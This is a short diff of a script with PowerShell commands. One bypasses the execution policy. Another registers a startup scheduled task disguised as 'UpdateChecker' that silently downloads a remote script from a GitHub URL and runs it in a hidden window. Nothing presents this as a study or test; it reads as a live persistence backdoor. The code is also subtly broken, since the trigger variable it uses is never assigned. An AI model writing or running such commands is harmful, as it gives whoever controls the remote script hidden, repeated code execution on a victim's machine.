@@ -1,3 +1,4 @@
 powershell -Command "Set-ExecutionPolicy Bypass"
 
+
 powershell -Command "New-ScheduledTaskTrigger -AtStartup; $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString(''http://raw.githubusercontent.com/nkt420/winstf/main/crs.ps1'')'; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'UpdateChecker' -Description 'd and e startup'"
